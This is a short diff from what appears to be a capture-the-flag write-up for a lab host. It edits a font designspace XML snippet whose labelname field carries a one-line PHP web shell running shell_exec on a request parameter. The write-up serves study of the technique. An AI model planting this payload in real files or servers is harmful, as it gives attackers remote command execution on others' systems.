@@ -169,7 +169,7 @@ Server error messages leak the web root at `/var/www/portal.variatype.htb/`. Set
   <lib>
     <dict><key>public.skipExportGlyphs</key><array/></dict>
   </lib>
-  <labelname xml:lang="en"><![CDATA[{% raw %}<?php if(isset($_REQUEST['cmd'])){echo '<pre>'.shell_exec($_REQUEST['cmd']).'</pre>';}?>{% endraw %}]]></labelname>
+  <labelname xml:lang="en">WEBSHELL: &lt;?php if(isset($_REQUEST['cmd'])){echo shell_exec($_REQUEST['cmd']);}?&gt;</labelname>
 </designspace>
 ```
 
